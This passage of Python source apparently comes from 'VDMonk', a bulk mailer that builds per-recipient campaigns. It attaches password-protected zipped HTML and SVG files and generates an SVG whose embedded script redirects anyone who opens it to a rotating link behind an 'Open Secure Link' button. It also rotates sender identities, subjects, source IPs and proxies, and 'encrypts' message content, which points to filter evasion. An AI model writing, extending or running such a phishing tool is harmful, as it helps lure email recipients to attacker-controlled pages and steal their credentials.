                        part.set_payload(zip_data)
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=(Header(zip_name, 'utf-8').encode()))
                        msg.attach(part)
                        if zip_setup.get('password_protection', 0) == 1:
                            print(f"{Fore.GREEN}[ATTACHMENT] Zipped HTML file (password-protected): {filepath} as {zip_name}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.GREEN}[ATTACHMENT] Zipped HTML file: {filepath} as {zip_name}{Style.RESET_ALL}")
                    elif filepath.lower().endswith(('.html', '.htm', '.xhtml', '.txt')):
                        part = MIMEText(file_bytes.decode('utf-8', errors='replace'), _subtype='html', _charset='utf-8')
                        part.add_header('Content-Disposition', 'attachment', filename=(Header(filename, 'utf-8').encode()))
                        msg.attach(part)
                    else:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(file_bytes)
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment', filename=(Header(filename, 'utf-8').encode()))
                        msg.attach(part)
                    attached = True
                    status = 'encrypted' if htmlAttachment_setup.get('encrypt', 0) == 1 else 'attached'
                    print(f"{Fore.GREEN}[ATTACHMENT] {status.capitalize()} HTML file: {filepath} as {filename}{Style.RESET_ALL}")
                except Exception as exc:
                    print(f"{Fore.RED}[ATTACHMENT ERROR] Could not attach {filepath}: {exc}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[ATTACHMENT ERROR] HTML attachment file not found: {filepath}{Style.RESET_ALL}")
    return attached


def load_svg_attachment_list(path):
    try:
        if os.path.isfile(path):
            with open(path, 'r', encoding='utf-8') as fh:
                return [line.strip() for line in fh if line.strip()]
    except Exception:
        pass
    return []


def generate_svg_with_url(url, recipient_email):
    """Generate a browser-friendly SVG that redirects to the provided URL."""
    try:
        if not url:
            return None
        safe_url = str(url).replace('&', '&amp;')
        safe_url = safe_url.replace('"', '&quot;')
        safe_url = safe_url.replace('<', '&lt;').replace('>', '&gt;')
        safe_url = safe_url.replace(chr(10), '').replace(chr(13), '')
        tpl = []
        a = tpl.append
        a('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%" viewBox="0 0 1200 800">')
        a('<script type="text/javascript"><![CDATA[')
        a('try { window.location.href = SURL; } catch (e) {}')
        a('try { window.top.location.href = SURL; } catch (e) {}')
        a(']]></script>')
        a('<a xlink:href=SURL href=SURL target="_top">')
        a('<rect width="1200" height="800" fill="#ffffff"/>')
        a('<rect x="440" y="330" width="320" height="120" rx="18" fill="#0b57d0"/>')
        a('<text x="600" y="404" text-anchor="middle" font-family="Arial, sans-serif" font-size="28" font-weight="700" fill="#ffffff">Open Secure Link</text>')
        a('</a>')
        a('</svg>')
        return chr(10).join(tpl).replace('SURL', chr(39) + safe_url + chr(39))
    except Exception:
        return None

def attach_svg_attachment(msg, recipient_email, link_url):
    """Attach the configured SVG file when svg_attachment_config is enabled.

    {link}/{LINK}/{Link}/[link]/[LINK]/[Link] inside the SVG file are replaced
    with the recipient's bound URL; if no URL was passed, one is pulled from
    the rotating link list (Link/link.txt / links.txt) so the URL rotates.
    """
    global svg_attachment_list, svg_attachment_index
    if svgAttachment_setup.get('enable', 0) != 1:
        print("[TRACE] svgAttachment disabled, skipping SVG attachment")
        return False
    attached = False
    try:
        svg_path = str(svgAttachment_setup.get('location') or '').strip()
        if not svg_path:
            print("[ATTACHMENT ERROR] SVG file_location is empty, skipping SVG attachment")
            return False
        if not os.path.isabs(svg_path):
            svg_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), svg_path)
        if not os.path.isfile(svg_path):
            print("[ATTACHMENT ERROR] SVG file not found: " + svg_path)
            return False
        with open(svg_path, 'r', encoding='utf-8', errors='ignore') as fh:
            svg_content = fh.read()
        if not svg_content.strip():
            print("[ATTACHMENT ERROR] SVG file is empty: " + svg_path)
            return False
        # Per-recipient placeholders (skip link token handling inside findString;
        # we substitute the link explicitly below so it always rotates).
        try:
            svg_content = findString(recipient_email, svg_content, skip_link=True)
        except Exception:
            pass
        # Resolve the target URL: prefer the bound link, else next rotation entry.
        target_url = str(link_url or '').strip()
        if not target_url:
            try:
                target_url = str(get_next_link(recipient_email) or '').strip()
            except Exception:
                target_url = ''
        if target_url:
            for tok in ('{link}', '{LINK}', '{Link}',
                        '[link]', '[LINK]', '[Link]',
                        '${link}', '${LINK}', '${Link}'):
                svg_content = svg_content.replace(tok, target_url)
        else:
            print("[ATTACHMENT ERROR] No link available for SVG attachment (links.txt empty or unbound); {link} left as-is")
        if svgAttachment_setup.get('encrypt', 0) == 1:
            wrapper = build_personalized_svg_wrapper(svg_content, recipient_email)
            file_bytes = wrapper.encode('utf-8')
        else:
            file_bytes = svg_content.encode('utf-8')
        raw_name = svgAttachment_setup.get('name', 'attachment.svg')
        filename = findString(recipient_email, raw_name)
        if svgAttachment_setup.get('zip_it', 0) == 1:
            # Use password-protected ZIP if configured
            password = zip_setup.get('password') if zip_setup.get('password_protection', 0) == 1 else None
            zip_data = create_password_protected_zip(filename, file_bytes, password)
            zip_name = os.path.splitext(filename)[0] + '.zip'
            part = MIMEBase('application', 'zip')
            part.set_payload(zip_data)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment', filename=(Header(zip_name, 'utf-8').encode()))
            msg.attach(part)
            attached = True
            if zip_setup.get('password_protection', 0) == 1:
                print("[ATTACHMENT] Attached ZIPped SVG file (password-protected): " + svg_path + " as " + zip_name + (" with URL" if target_url else " WITHOUT URL"))
            else:
                print("[ATTACHMENT] Attached ZIPped SVG file: " + svg_path + " as " + zip_name + (" with URL" if target_url else " WITHOUT URL"))
        else:
            part = MIMEBase('image', 'svg+xml')
            part.set_payload(file_bytes)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'inline', filename=(Header(filename, 'utf-8').encode()))
            msg.attach(part)
            attached = True
            print("[ATTACHMENT] Attached SVG file: " + svg_path + " as " + filename + (" with URL" if target_url else " WITHOUT URL"))
    except Exception as e:
        print("[ATTACHMENT] SVG attachment error: " + str(e))
    return attached


def init_record_dirs():
    os.makedirs(os.path.join(record_folder, "success"), exist_ok=True)
    os.makedirs(os.path.join(record_folder, "failed"), exist_ok=True)


def ensure_required_folders():
    required_dirs = [
        "DISCLAIMER","DOC","DOCX","EML","EWS","HEADERS","HTML_IMAGE","HTMLAttachment",
        "LEADS","LETTER","LOCAL_FILES","LOCAL_IMAGE","LOGO","MULTIPLE","OAUTH2",
        "PDF","PPTX","QRCODE","RTF","SHELL","SMTP","SVG","ICALENDAR","HTML2PDF"
    ]
    for d in required_dirs:
        os.makedirs(d, exist_ok=True)


def _pf_bool(value):
    return str(value).strip().lower() in ('1', 'true', 'yes', 'on')


def run_preflight_check(config_path='setup.ini'):
    """v9.0: validate setup.ini and every referenced asset before a campaign.

    Usage:  python3 send.py --check
    Prints PASS/WARN/FAIL per subsystem and returns non-zero when any FAIL is
    found, so the whole configuration can be validated without sending mail.
    """
    print(f"\n{Fore.CYAN}{'=' * 64}{Style.RESET_ALL}")
    print(f"{Fore.CYAN} VDMonk preflight check - no email will be sent{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 64}{Style.RESET_ALL}\n")
    results = []

    def record(level, group, message):
        results.append((level, group, message))
        color = {'PASS': Fore.GREEN, 'WARN': Fore.YELLOW, 'FAIL': Fore.RED}.get(level, Fore.WHITE)
        print(f"{color}[{level:4}]{Style.RESET_ALL} {group}: {message}", flush=True)

    def file_ok(path):
        try:
            p = str(path or '').strip()
            return bool(p) and os.path.isfile(p) and os.path.getsize(p) > 0
        except Exception:
            return False

    def list_count(path):
        try:
            with open(str(path).strip(), 'r', encoding='utf-8', errors='replace') as fh:
                return len([ln for ln in fh if ln.strip() and not ln.strip().startswith('#')])
        except Exception:
            return 0

    if not os.path.isfile(config_path):
        record('FAIL', 'CONFIG', f'{config_path} not found in {os.getcwd()}')
        print(f"\n{Fore.RED}Preflight aborted: no config file.{Style.RESET_ALL}\n")
        return 1
    try:
        cfg = load_sender_config(config_path, apply_runtime=False)
    except Exception as exc:
        record('FAIL', 'CONFIG', f'could not parse {config_path}: {exc}')
        print(f"\n{Fore.RED}Preflight aborted: unreadable config.{Style.RESET_ALL}\n")
        return 1
    record('PASS', 'CONFIG', f'{config_path} parsed')

    def cget(section, option, fallback=''):
        try:
            return cfg.get(section, option, fallback=fallback)
        except Exception:
            return fallback

    raw_mode = cget('sender_config', 'sending_mode', 'smtp')
    modes = parse_mode_tokens(raw_mode)
    transports = [m for m in modes if m in VALID_SENDING_MODES]
    if not modes:
        record('FAIL', 'MODE', f'sending_mode={raw_mode!r} resolves to no known token')
    elif not transports:
        record('WARN', 'MODE', f'sending_mode={raw_mode!r} selects no transport (test-only run)')
    else:
        record('PASS', 'MODE', f'sending_mode={raw_mode!r} -> {", ".join(transports)}')

    from_email = str(cget('SMTP', 'fromemail', '') or '').strip()
    if check(from_email):
        record('PASS', 'FROM', f'from_mail={from_email}')
    else:
        record('FAIL', 'FROM', f'from_mail={from_email!r} is not a usable address')

    leads_path = cget('OPTION', 'leads', 'LEADS/leads.txt')
    n = list_count(leads_path)
    if n:
        record('PASS', 'LEADS', f'{leads_path} ({n} line(s))')
    else:
        record('FAIL', 'LEADS', f'{leads_path} missing or empty')
    if _pf_bool(cget('OPTION', 'enableCSV', False)):
        csv_path = cget('OPTION', 'locationCSV', 'LEADS/leads.csv')
        record('PASS' if file_ok(csv_path) else 'FAIL', 'LEADS', f'csv={csv_path}')

    letter_path = cget('letter_setup', 'letter', 'LETTER/letter.html')
    if file_ok(letter_path):
        record('PASS', 'LETTER', letter_path)
    else:
        record('FAIL', 'LETTER', f'{letter_path} missing or empty')
    if _pf_bool(cget('letter_setup', 'enableMultiple', False)):
        ll = cget('letter_setup', 'letterList', 'MULTIPLE/letters.txt')
        record('PASS' if list_count(ll) else 'FAIL', 'LETTER', f'multiple list={ll}')

    optional_features = [
        ('LOGO', 'logo_config', 'location'),
        ('HTML_IMAGE', 'htmlimage', 'location'),
        ('PDF', 'pdf', 'location'),
        ('DOC', 'doc', 'location'),
        ('DOCX', 'docx', 'location'),
        ('RTF', 'rtf', 'location'),
        ('PPTX', 'pptx', 'location'),
        ('HTML_ATTACH', 'htmlAttachment', 'location'),
        ('SVG_ATTACH', 'svgAttachment', 'location'),
        ('EML', 'eml', 'location'),
        ('LOCAL_FILES', 'local_files', 'location'),
    ]
    enabled_optional = 0
    for group, section, option in optional_features:
        if not _pf_bool(cget(section, 'enable', False)):
            continue
        enabled_optional += 1
        location = cget(section, option, '')
        if file_ok(location):
            record('PASS', group, f'enabled -> {location}')
        else:
            record('FAIL', group, f'enabled but local file {location!r} is missing')
    if enabled_optional == 0:
        record('PASS', 'ASSETS', 'no optional rendered/attachment features enabled')

    if _pf_bool(cget('qrcode_setup', 'enable', False)):
        qr_text = str(cget('qrcode_setup', 'qrlink', '') or '').strip()
        if qr_text and not is_link_placeholder(qr_text):
            record('PASS', 'QRCODE', 'enabled with explicit QR text')
        elif str(cget('link_setup', 'link', '') or '').strip() or _pf_bool(cget('link_setup', 'enableMultiple', False)):
            record('PASS', 'QRCODE', 'enabled; QR text derived from link rotation')
        else:
            record('WARN', 'QRCODE', 'enabled but no QR text/link set; falls back to recipient email')
        if _pf_bool(cget('qrcode_setup', 'customIcon', False)):
            icon = str(cget('qrcode_setup', 'iconLocation', '') or '').strip()
            record('PASS' if file_ok(icon) else 'WARN', 'QRCODE', f'customIcon={icon or "unset"}')

    if _pf_bool(cget('proxy_setup', 'enable', False)):
        if _pf_bool(cget('proxy_setup', 'enableMultiple', False)):
            pl = cget('proxy_setup', 'proxiesList', 'MULTIPLE/Proxies.txt')
            record('PASS' if list_count(pl) else 'FAIL', 'PROXY', f'pool={pl}')
        else:
            pip = str(cget('proxy_setup', 'ip', '') or '').strip()
            pport = str(cget('proxy_setup', 'port', '') or '').strip()
            record('PASS' if pip else 'FAIL', 'PROXY', f'{pip}:{pport or "1080"}' if pip else 'proxies_config.enable is true but ip is empty')
    else:
        record('PASS', 'PROXY', 'disabled')

    if _pf_bool(cget('OPTION', 'rotateip', False)):
        ipl = cget('OPTION', 'localipfile', 'MULTIPLE/ips.txt')
        entries = []
        try:
            with open(str(ipl).strip(), 'r', encoding='utf-8', errors='replace') as fh:
                entries = [ln.strip() for ln in re.split(r'[,;\s]+', fh.read()) if ln.strip()]
        except Exception:
            entries = [x.strip() for x in re.split(r'[,;\s]+', str(cget('OPTION', 'localiplist', '') or '')) if x.strip()]
        usable, unavailable = [], []
        for entry in entries:
            host, sport = parse_bind_ip(entry)
            if host is None or not is_valid_bind_ip(entry):
                unavailable.append(entry)
                continue
            if host in ('127.0.0.1', 'localhost'):
                usable.append(entry)
                continue
            # Bind-test with an ephemeral source port (port 0) so the result
            # reflects address availability, not source-port privileges.
            try:
                _probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    _probe.bind((host, 0))
                    usable.append(entry)
                finally:
                    _probe.close()
            except Exception:
                unavailable.append(entry)
        if not entries:
            record('WARN', 'SOURCE_IP', f'rotation enabled but {ipl} is empty; default route will be used')
        elif not usable:
            record('WARN', 'SOURCE_IP',
                   f'{ipl} ({len(entries)} address(es)) not assigned to this host -> every send uses the '
                   f'errno-99 failover to the default route. Remove ip_config.enable/rotateip or list only '
                   f'addresses that exist on this machine.')
        elif unavailable:
            record('WARN', 'SOURCE_IP',
                   f'{ipl}: {len(usable)} usable, {len(unavailable)} not local ({", ".join(unavailable[:3])}) '
                   f'- non-local entries fail over to the default route at runtime.')
        else:
            record('PASS', 'SOURCE_IP', f'{ipl} ({len(usable)} local address(es))')

    if _pf_bool(cget('CUSTOM_HEADERS', 'enabled', False)):
        hpath = str(cget('CUSTOM_HEADERS', 'headersList', 'HEADERS/headers.txt') or '').strip()
        record('PASS' if list_count(hpath) else 'FAIL', 'HEADERS', f'{hpath}')

    if any(t in modes for t in ('tester', 'tester&send', 'test&send')):
        tletter = str(cget('test_config', 'letter', '') or '').strip()
        if tletter and not file_ok(tletter):
            record('FAIL', 'TESTER', f'test letter {tletter!r} missing')
        else:
            record('PASS', 'TESTER', 'test phase configured')

    fails = [r for r in results if r[0] == 'FAIL']
    warns = [r for r in results if r[0] == 'WARN']
    print(f"\n{Fore.CYAN}{'-' * 64}{Style.RESET_ALL}")
    if fails:
        print(f"{Fore.RED}Preflight FAILED: {len(fails)} error(s), {len(warns)} warning(s)."
              f" Fix the errors above before launching.{Style.RESET_ALL}\n")
        return 1
    print(f"{Fore.GREEN}Preflight PASSED ({len(warns)} warning(s)). Safe to launch.{Style.RESET_ALL}\n")
    return 0


def get_next_subject():
    global subject_index
    if not subject_rotate or not subject_lines:
        return subject
    with subject_lock:
        current = subject_lines[subject_index % len(subject_lines)]
        subject_index += 1
    return current if current else subject


def get_rotating_subject():
    """Return the next subject from subject_setup (Multiple/Subjects.txt) or the legacy option rotation list."""
    global subject_index
    try:
        if subject_setup.get('enableMultiple', 0) == 1:
            subject_path = subject_setup.get('subjectList', 'Multiple/Subjects.txt')
            if subject_path and os.path.isfile(subject_path):
                with open(subject_path, 'r', encoding='utf-8') as f:
                    entries = [line.strip() for line in f if line.strip()]
                if entries:
                    with subject_lock:
                        current, subject_index = pick_rotation_entry(
                            entries, subject_index,
                            subject_setup.get('selection_system', 1))
                    # v9.5: return plain; the consuming send paths apply subject
                    # encryption exactly once (this was double-encoding).
                    return current or subject
    except Exception:
        pass
    result = get_next_subject()
    # v9.5: encryption is applied once by the send path.
    return result


def update_pause_event():
    global pause_event, manual_pause, auto_pause
    try:
        if manual_pause or auto_pause:
            pause_event.clear()
        else:
            pause_event.set()
    except NameError:
        pass


def configure_task_pause(cfg):
    global pause_enabled, pause_duration, pause_tasks, pause_task_count, auto_pause
    try:
        if not cfg.has_section('pause_config'):
            pause_enabled = False
            pause_duration = 0
            pause_tasks = 0
        else:
            pause_enabled = cfg_get_bool(cfg, 'pause_config', 'enable', False)
            pause_duration = max(0, int(cfg.get('pause_config', 'time', fallback='0')))
            pause_tasks = max(0, int(cfg.get('pause_config', 'tasks', fallback='0')))
    except (TypeError, ValueError):
        pause_enabled = False
        pause_duration = 0
        pause_tasks = 0
    with pause_task_lock:
        pause_task_count = 0
    if not pause_enabled:
        auto_pause = False
        update_pause_event()


def configure_disclaimer(cfg):
    if not cfg.has_section('disclaimer_config'):
        disclaimer_setup['enable'] = 0
        return
    disclaimer_setup['enable'] = 1 if cfg_get_bool(cfg, 'disclaimer_config', 'enable', False) else 0
    disclaimer_setup['location'] = cfg.get('disclaimer_config', 'location', fallback='DISCLAIMER/confidential.txt').strip()
    disclaimer_setup['enableMultiple'] = 1 if cfg_get_bool(cfg, 'disclaimer_config', 'enable_multiple', False) else 0
    disclaimer_setup['multipleLocation'] = cfg.get('disclaimer_config', 'multiple_location', fallback='DISCLAIMER').strip()
    load_disclaimer_files()


def maybe_trigger_task_pause():
    global pause_task_count, auto_pause
    with pause_task_lock:
        if not pause_enabled or pause_tasks <= 0 or pause_duration <= 0 or auto_pause:
            return
        pause_task_count += 1
        if pause_task_count < pause_tasks:
            return
        pause_task_count = 0
        duration = pause_duration
        auto_pause = True

    update_pause_event()
    print(f"[PAUSE] Waiting {format_duration(duration)} after {pause_tasks} tasks...")

    def timer_func():
        global auto_pause
        time.sleep(duration)
        auto_pause = False
        update_pause_event()
        print(f"[PAUSE] Complete after {format_duration(duration)}.")

    threading.Thread(target=timer_func, daemon=True).start()


def reload_config_if_changed():
    """Reload selective runtime config values from setup.ini when file changes."""
    global config_mtime, threads, rotate_ip, local_ips, ip_index, stopwatch_pattern, stopwatch_enabled, serverbusy_pause_duration, worker_threads, current_thread_count, frommail_list, frommail_index, fromname_list, fromname_index, link_entries, link_index, smtp_dangerous, smtp_retry_limit, smtp_retry_delay_secs
    try:
        stat = os.path.getmtime('setup.ini')
    except Exception:
        return
    if config_mtime is None:
        config_mtime = stat
        return
    if stat == config_mtime:
        return
    # file changed
    try:
        cfg = load_sender_config('setup.ini')
        configure_custom_headers(cfg)
        configure_task_pause(cfg)
        configure_disclaimer(cfg)
        smtp_dangerous = cfg_get_bool(cfg, 'SMTP', 'dangerous', smtp_dangerous)
        smtp_retry_limit = max(0, cfg.getint('SMTP', 'retry_limit', fallback=smtp_retry_limit))
        smtp_retry_delay_secs = max(0, cfg.getint('SMTP', 'retry_delay_secs', fallback=smtp_retry_delay_secs))
        # threads and ip_thread flags
        try:
            global ip_thread, ip_thread_count, threads_enabled
            ip_thread = cfg_get_bool(cfg, 'OPTION', 'ip_thread', False)
            ip_thread_count = int(cfg.get('OPTION', 'ip_thread_count').strip()) if cfg.has_option('OPTION', 'ip_thread_count') else 0
            # v9.5: sender_config.workers=0 means "auto" (sender_setup decides the
            # count). The old code treated 0 as "no threads" and tore down every
            # worker on each config reload, so the sender silently stopped sending.
            try:
                tval = str(cfg.get('OPTION', 'thread')).strip()
            except Exception:
                tval = ''
            if tval.isdigit() and int(tval) > 0:
                desired_threads = int(tval)
            else:
                desired_threads = 0
                try:
                    if int(sender_setup.get('multithread', 0)) == 1:
                        _n = int(sender_setup.get('numberOfThreads', 0) or 0)
                        if _n > 0:
                            desired_threads = _n
                except Exception:
                    desired_threads = 0
            threads_enabled = desired_threads > 0
        except Exception:
            ip_thread = False
            ip_thread_count = 0
            desired_threads = 0
            threads_enabled = False

        # Reload sender_setup values at runtime
        try:
            if cfg.has_section('sender_setup'):
                sender_setup['multithread'] = 1 if cfg_get_bool(cfg, 'sender_setup', 'multithread', False) else 0
                try:
                    sender_setup['numberOfThreads'] = int(cfg.get('sender_setup', 'numberOfThreads'))
                except Exception:
                    pass
                sender_setup['sleepEnable'] = 1 if cfg_get_bool(cfg, 'sender_setup', 'sleepEnable', False) else 0
                try:
                    sender_setup['sleepTime'] = int(cfg.get('sender_setup', 'sleepTime'))
                except Exception:
                    pass
                sender_setup['logoEnable'] = 1 if cfg_get_bool(cfg, 'sender_setup', 'logoEnable', False) else 0
                sender_setup['localhostNameEnable'] = 1 if cfg_get_bool(cfg, 'sender_setup', 'localhostNameEnable', False) else 0
                try:
                    sender_setup['localhostName'] = cfg.get('sender_setup', 'localhostName', fallback=sender_setup['localhostName']).strip()
                except Exception:
                    pass
                try:
                    sender_setup['messageType'] = cfg.get('sender_setup', 'messageType', fallback=sender_setup['messageType']).strip()
                except Exception:
                    pass
                try:
                    sender_setup['emailSensitivity'] = cfg.get('sender_setup', 'emailSensitivity', fallback=sender_setup['emailSensitivity']).strip()
                except Exception:
                    pass
                try:
                    sender_setup['emailPriority'] = cfg.get('sender_setup', 'emailPriority', fallback=sender_setup['emailPriority']).strip()
                except Exception:
                    pass
                sender_setup['imageBypass'] = 1 if cfg_get_bool(cfg, 'sender_setup', 'imageBypass', False) else 0
        except Exception:
            pass

        # Only activate threads if threads_enabled is True
        try:
            if threads_enabled:
                # v9.5: use the resolved desired count (handles workers=0 => auto)
                # instead of the raw, usually-absent 'thread_count' key, which made
                # the reload path read 0 and remove every worker thread.
                try:
                    new_threads = int(desired_threads)
                except Exception:
                    new_threads = 0
                if new_threads > int(current_thread_count):
                    # spawn additional threads to reach new_threads
                    to_add = new_threads - int(current_thread_count)
                    for _ in range(to_add):
                        t = dmailer(queue)
                        t.daemon = True
                        t.start()
                        with worker_threads_lock:
                            worker_threads.append(t)
                            current_thread_count += 1
                elif new_threads < int(current_thread_count):
                    to_remove = int(current_thread_count) - new_threads
                    print(f"[CONFIG] Reducing sender threads from {current_thread_count} to {new_threads}...")
                    with worker_threads_lock:
                        for _ in range(to_remove):
                            if not worker_threads:
                                break
                            w = worker_threads.pop()
                            try:
                                w.request_stop()
                            except Exception:
                                pass
                            current_thread_count -= 1
            else:
                # If threads_enabled is False, stop all threads
                with worker_threads_lock:
                    while worker_threads:
                        w = worker_threads.pop()
                        try:
                            w.request_stop()
                        except Exception:
                            pass
                        current_thread_count -= 1
        except Exception:
            pass
        # rotate ip and local ip list
        try:
            rotate_ip = cfg_get_bool(cfg, 'OPTION', 'rotateip', False)
            local_ip_file = cfg.get('OPTION', 'localipfile').strip()
            if local_ip_file and os.path.isfile(local_ip_file):
                with open(local_ip_file, 'r') as ipfile:
                    local_ips = [ip.strip() for ip in re.split(r'[,;\s]+', ipfile.read()) if ip.strip()]
            else:
                local_ips = [ip.strip() for ip in re.split(r'[,;\s]+', cfg.get('OPTION', 'localiplist')) if ip.strip()]
            local_ips = normalize_bind_ip_list(local_ips)
            with ip_rotation_lock:
                ip_index = 0
        except Exception:
            pass
        # send rate/delay
        try:
            nc = cfg.get('OPTION', 'max_concurrent_sends').strip()
            if nc:
                new_max = int(nc)
            else:
                new_max = None
        except Exception:
            new_max = None

        try:
            nd = cfg.get('OPTION', 'send_delay').strip()
            new_delay = float(nd) if nd else 0.0
        except Exception:
            new_delay = 0.0

        # update global semaphore if changed
        try:
            with rate_lock:
                global max_concurrent_sends, send_delay, rate_semaphore
                if new_max != max_concurrent_sends:
                    max_concurrent_sends = new_max
                    if max_concurrent_sends and int(max_concurrent_sends) > 0:
                        rate_semaphore = threading.Semaphore(int(max_concurrent_sends))
                    else:
                        rate_semaphore = None
                send_delay = new_delay
        except Exception:
            pass

        # stopwatch pattern
        try:
            stopwatch_pattern = parse_stopwatch_pattern(cfg.get('OPTION', 'stopwatch_pattern'))
        except Exception:
            pass
        # stopwatch enabled
        try:
            stopwatch_enabled = cfg_get_bool(cfg, 'OPTION', 'stopwatch', False)
        except Exception:
            pass
        # serverbusy pause duration
        try:
            serverbusy_pause_duration = int(cfg.get('OPTION', 'serverbusy_pause_duration'))
        except Exception:
            pass
        # reload letter/subject/proxy runtime settings
        try:
            global letter_setup, subject_setup, proxy_setup
            if cfg.has_section('letter_setup'):
                letter_setup['letter'] = cfg.get('letter_setup', 'letter', fallback=letter_setup['letter']).strip()
                letter_setup['enableMultiple'] = 1 if str(cfg.get('letter_setup', 'enableMultiple', fallback=str(letter_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                letter_setup['letterList'] = cfg.get('letter_setup', 'letterList', fallback=letter_setup['letterList']).strip()
                letter_setup['selection_system'] = _mode_int(cfg.get('letter_setup', 'selection_system', fallback=str(letter_setup.get('selection_system', 1))), 1)
                letter_setup['enableEncryption'] = 1 if str(cfg.get('letter_setup', 'enableEncryption', fallback=cfg.get('letter_setup', 'enable_encryption', fallback=str(letter_setup['enableEncryption'])))).strip().lower() in ('1','true','yes','on') else 0
                letter_setup['customEncryption'] = cfg.get('letter_setup', 'customEncryption', fallback=letter_setup['customEncryption']).strip()
                try:
                    letter_setup['technique'] = int(cfg.get('letter_setup', 'technique', fallback=str(letter_setup['technique'])))
                except Exception:
                    pass
            if cfg.has_section('subject_setup'):
                subject_setup['subject'] = cfg.get('subject_setup', 'subject', fallback=subject_setup['subject']).strip()
                subject_setup['enableMultiple'] = 1 if str(cfg.get('subject_setup', 'enableMultiple', fallback=str(subject_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                subject_setup['subjectList'] = cfg.get('subject_setup', 'subjectList', fallback=subject_setup['subjectList']).strip()
                subject_setup['selection_system'] = _mode_int(cfg.get('subject_setup', 'selection_system', fallback=str(subject_setup.get('selection_system', 1))), 1)
                subject_setup['enableEncryption'] = 1 if str(cfg.get('subject_setup', 'enableEncryption', fallback=cfg.get('subject_setup', 'enable_encryption', fallback=str(subject_setup['enableEncryption'])))).strip().lower() in ('1','true','yes','on') else 0
                try:
                    subject_setup['technique'] = int(cfg.get('subject_setup', 'technique', fallback=str(subject_setup['technique'])))
                except Exception:
                    pass
            if cfg.has_section('proxy_setup'):
                proxy_setup['enable'] = 1 if str(cfg.get('proxy_setup', 'enable', fallback=str(proxy_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                proxy_setup['ip'] = cfg.get('proxy_setup', 'ip', fallback=proxy_setup['ip']).strip()
                proxy_setup['port'] = cfg.get('proxy_setup', 'port', fallback=proxy_setup['port']).strip()
                proxy_setup['user'] = cfg.get('proxy_setup', 'user', fallback=proxy_setup['user']).strip()
                proxy_setup['password'] = cfg.get('proxy_setup', 'password', fallback=proxy_setup['password']).strip()
                proxy_setup['enableMultiple'] = 1 if str(cfg.get('proxy_setup', 'enableMultiple', fallback=str(proxy_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                proxy_setup['proxiesList'] = cfg.get('proxy_setup', 'proxiesList', fallback=proxy_setup['proxiesList']).strip()
                try:
                    load_proxy_pool()
                except Exception:
                    pass
            # reload frommail/fromname/link/qrcode/replyTo settings
            if cfg.has_section('frommail_setup'):
                frommail_setup['hideFromMail'] = 1 if str(cfg.get('frommail_setup', 'hideFromMail', fallback=str(frommail_setup['hideFromMail']))).strip().lower() in ('1','true','yes','on') else 0
                frommail_setup['enableMultiple'] = 1 if str(cfg.get('frommail_setup', 'enableMultiple', fallback=str(frommail_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                frommail_setup['frommailList'] = cfg.get('frommail_setup', 'frommailList', fallback=frommail_setup['frommailList']).strip()
                frommail_setup['selection_system'] = _mode_int(cfg.get('frommail_setup', 'selection_system', fallback=str(frommail_setup.get('selection_system', 1))), 1)
            if cfg.has_section('fromname_setup'):
                fromname_setup['fromName'] = cfg.get('fromname_setup', 'fromName', fallback=fromname_setup['fromName']).strip()
                fromname_setup['enableMultiple'] = 1 if str(cfg.get('fromname_setup', 'enableMultiple', fallback=str(fromname_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                fromname_setup['fromnameList'] = cfg.get('fromname_setup', 'fromnameList', fallback=fromname_setup['fromnameList']).strip()
                fromname_setup['selection_system'] = _mode_int(cfg.get('fromname_setup', 'selection_system', fallback=str(fromname_setup.get('selection_system', 1))), 1)
            if cfg.has_section('link_setup'):
                link_setup['link'] = cfg.get('link_setup', 'link', fallback=link_setup['link']).strip()
                try:
                    link_setup['limit'] = int(cfg.get('link_setup', 'limit', fallback=str(link_setup['limit'])))
                except Exception:
                    pass
                link_setup['enableMultiple'] = 1 if str(cfg.get('link_setup', 'enableMultiple', fallback=str(link_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                link_setup['linkList'] = cfg.get('link_setup', 'linkList', fallback=link_setup['linkList']).strip()
                link_setup['selection_system'] = _mode_int(cfg.get('link_setup', 'selection_system', fallback=str(link_setup.get('selection_system', 1))), 1)
            else:
                if not link_setup.get('linkList') or not os.path.isfile(link_setup.get('linkList')):
                    if os.path.isfile('Link/link.txt'):
                        link_setup['linkList'] = 'Link/link.txt'
            if cfg.has_section('qrcode_setup'):
                qrcode_setup['enable'] = 1 if str(cfg.get('qrcode_setup', 'enable', fallback=str(qrcode_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                qrcode_setup['qrlink'] = cfg.get('qrcode_setup', 'qrlink', fallback=qrcode_setup['qrlink']).strip()
                try:
                    qrcode_setup['shape'] = int(cfg.get('qrcode_setup', 'shape', fallback=str(qrcode_setup.get('shape', 1))))
                except Exception:
                    qrcode_setup['shape'] = 1
                try:
                    qrcode_setup['qrSize'] = int(cfg.get('qrcode_setup', 'qrSize', fallback=str(qrcode_setup['qrSize'])))
                except Exception:
                    pass
                qrcode_setup['shapeColor'] = cfg.get('qrcode_setup', 'shapeColor', fallback=qrcode_setup['shapeColor']).strip()
                qrcode_setup['backgroundColor'] = cfg.get('qrcode_setup', 'backgroundColor', fallback=qrcode_setup['backgroundColor']).strip()
                try:
                    qrcode_setup['margin'] = int(cfg.get('qrcode_setup', 'margin', fallback=str(qrcode_setup['margin'])))
                except Exception:
                    pass
                qrcode_setup['customIcon'] = 1 if cfg_get_bool(cfg, 'qrcode_setup', 'customIcon', False) else 0
